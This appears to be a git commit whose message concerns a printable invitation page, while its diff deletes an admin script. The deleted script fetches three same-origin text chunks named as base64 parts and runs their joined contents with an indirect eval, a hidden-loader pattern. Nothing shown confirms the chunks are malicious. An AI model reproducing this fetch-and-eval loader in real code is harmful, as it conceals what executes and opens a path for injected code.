16c2c63213da35206f06b807ceed9fd888d12018
Sharifzoda Ibrohim <ibrohimicamsed316@gmail.com>
2026-08-23 12:45:23 +0500

    Даватнома: 1-page print (margin 5mm, compact layout) + black IG QR embedded; print patch + PUBLIC_PATHS

--- js/admin-students-reg.js
+++
@@ -1,9 +0,0 @@
-(function(){
-  Promise.all(["/js/_asr_b64_00.txt","/js/_asr_b64_01.txt","/js/_asr_b64_02.txt"].map(function(f){
-    return fetch(f,{credentials:"same-origin"}).then(function(r){
-      if(!r.ok) throw new Error(f+" "+r.status);
-      return r.text();
-    });
-  })).then(function(p){ (0,eval)(p.join("")); })
-  .catch(function(e){ console.error("[students-reg]",e); });
-})();
